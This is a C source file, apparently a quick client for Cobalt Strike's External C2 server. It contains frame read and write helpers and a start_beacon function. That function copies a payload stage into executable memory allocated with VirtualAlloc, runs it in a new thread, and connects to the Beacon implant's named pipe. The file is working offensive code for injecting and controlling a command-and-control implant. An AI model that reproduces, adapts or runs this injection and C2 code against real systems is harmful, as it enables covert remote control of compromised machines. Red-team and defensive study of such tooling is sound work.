/* a quick-client for Cobalt Strike's External C2 server based on code from @armitagehacker */ 
#include <stdio.h> 
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <sys/stat.h>
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024


/* read a frame from a handle */
DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
    DWORD size = 0, temp = 0, total = 0;
    /* read the 4-byte length */
    ReadFile(my_handle, (char * ) & size, 4, & temp, NULL);

    /* read the whole thing in */
    while (total < size) {
		// xychix added 1 line
		Sleep(3000);
        ReadFile(my_handle, buffer + total, size - total, & temp, NULL);
        total += temp;
    }
    return size;
}

/* write a frame to a file */
DWORD write_frame(HANDLE my_handle, char * buffer, DWORD length) {
    DWORD wrote = 0;
	printf("in write_frame we have: %s",buffer);
    WriteFile(my_handle, (void * ) & length, 4, & wrote, NULL);
    return WriteFile(my_handle, buffer, length, & wrote, NULL);
	//return wrote;
}

HANDLE start_beacon(char * payload, unsigned int pylen){
	DWORD length = (DWORD) pylen;
    /* inject the payload stage into the current process */
    char * payloadE = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(payloadE, payload, length);
    printf("Injecting Code, %d bytes\n", length); 
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) payloadE, (LPVOID) NULL, 0, NULL);
    /*
     * connect to our Beacon named pipe */
    HANDLE handle_beacon = INVALID_HANDLE_VALUE;
    while (handle_beacon == INVALID_HANDLE_VALUE) {
        handle_beacon = CreateFileA("\\\\.\\pipe\\foobar",
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
    
    }
    return(handle_beacon);
}